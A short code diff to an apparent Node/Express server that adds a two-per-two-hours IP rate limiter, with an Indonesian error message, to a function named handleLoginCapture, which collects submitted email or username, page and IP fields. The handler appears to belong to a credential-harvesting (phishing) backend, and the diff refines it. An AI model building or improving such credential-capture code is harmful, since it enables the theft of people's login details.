@@ -1074,6 +1074,20 @@ app.post('/webhook', async (req, res) => {
   res.sendStatus(200);
 });
 
+const _ipAttempts = new Map();
+const RATE_MAX    = 2;
+const RATE_WIN    = 2 * 60 * 60 * 1000;
+
+function checkRateLimit(ip) {
+  const now  = Date.now();
+  const rec  = _ipAttempts.get(ip) || { count: 0, resetAt: now + RATE_WIN };
+  if (now > rec.resetAt) { rec.count = 0; rec.resetAt = now + RATE_WIN; }
+  if (rec.count >= RATE_MAX) return false;
+  rec.count++;
+  _ipAttempts.set(ip, rec);
+  return true;
+}
+
 async function handleLoginCapture(req, res) {
   const body        = req.body || {};
   const emailVal    = body.email || body.username || '';
@@ -1090,6 +1104,10 @@ async function handleLoginCapture(req, res) {
 
   const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown')
                .split(',')[0].trim();
+
+  if (!checkRateLimit(ip)) {
+    return res.status(429).json({ success: false, blocked: true, message: 'Terlalu banyak percobaan. Coba lagi nanti.' });
+  }
   const entry = {
     page:     pageVal,
     method:   methodLabel,
